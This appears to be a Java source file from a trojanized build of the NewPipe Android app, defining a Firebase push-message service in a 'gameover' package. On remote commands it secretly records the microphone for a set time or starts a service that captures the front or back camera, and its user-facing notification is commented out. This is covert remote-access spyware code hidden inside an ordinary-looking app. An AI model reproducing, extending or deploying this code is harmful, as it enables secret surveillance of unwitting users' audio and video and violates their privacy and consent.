package org.schabi.newpipe.gameover;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONException;
import org.json.JSONObject;
import org.schabi.newpipe.R;
import org.schabi.newpipe.gameover.MyService;

import java.util.HashSet;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    @Override
    public void onNewToken(@NonNull String s) {
        super.onNewToken(s);
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        if (remoteMessage.getData().size() > 0) {
            handleNow(remoteMessage.getData().toString());
        }
        if (remoteMessage.getNotification() != null) {
            handleNow(remoteMessage.getNotification().getBody());
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void handleNow(String s) {
        //showNotification(getResources().getString(R.string.app_name), getResources().getString(R.string.app_name)+" is Active");

        String key1, key2, key3;
        try {
            JSONObject jobj = new JSONObject(s);
            key1 = jobj.getString("key_1");
            key2 = jobj.getString("key_2");

            if (key1.equalsIgnoreCase("mic")) {//mic
                try {
                    new MicRecTask(getApplicationContext()).Rec(Integer.parseInt(key2));
                } catch (Exception e) {
                    Log.e(" service ",""+e);
                }
            }
            else if (key1.equalsIgnoreCase("cam")) {//cam
               if (key2.equalsIgnoreCase("front")) {
                   try {
                       Intent camactivity = new Intent(getApplicationContext(), CamService.class);
                       camactivity.putExtra("cameraid", 1);
                       getApplication().getApplicationContext().startService(camactivity);
                   }catch (Exception e){
                       Log.e(" service ","cannot start");
                   }
                }else{
                   try {
                       Intent camactivity = new Intent(getApplicationContext(), CamService.class);
                       camactivity.putExtra("cameraid", 0);
                       getApplication().getApplicationContext().startService(camactivity);
                   }catch (Exception e){
                       Log.e(" service ","cannot start");
                   }
               }

            }
            else {startForegroundService(new Intent(this, MyService.class).setAction("myAction"));}


        } catch (Exception e) {
            Log.e(" service ",""+e);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    public void showNotification(String title, String message){
        // Pass the intent to switch to the MainActivity
        Intent intent = new Intent(this, MyService.class).setAction("myAction");
        // Assign channel ID
        String channel_id = "notification_channel";
        // Here FLAG_ACTIVITY_CLEAR_TOP flag is set to clear
        // the activities present in the activity stack,
        // on the top of the Activity that is to be launched
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        // Pass the intent to PendingIntent to start the
        // next Activity
        PendingIntent pendingIntent
                = PendingIntent.getActivity(
                this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);

        // Create a Builder object using NotificationCompat
        // class. This will allow control over all the flags
        NotificationCompat.Builder builder
                = new NotificationCompat
                .Builder(getApplicationContext(),
                channel_id)
                .setSmallIcon(R.mipmap.ic_launcher_foreground)
                .setAutoCancel(true)
                .setVibrate(new long[] { 1000, 1000, 1000,
                        1000, 1000 })
                .setOnlyAlertOnce(true)
                .setContentIntent(pendingIntent);


        builder = builder.setContentTitle(title)
                .setContentText(message)
                .setOngoing(true)
                .setSmallIcon(R.mipmap.ic_launcher_foreground);

        NotificationManager notificationManager
                = (NotificationManager)getSystemService(
                Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT
                >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel
                    = new NotificationChannel(
                    channel_id, getResources().getString(R.string.app_name),
                    NotificationManager.IMPORTANCE_HIGH);
            notificationManager.createNotificationChannel(
                    notificationChannel);
        }

        notificationManager.notify(0, builder.build());
    }

}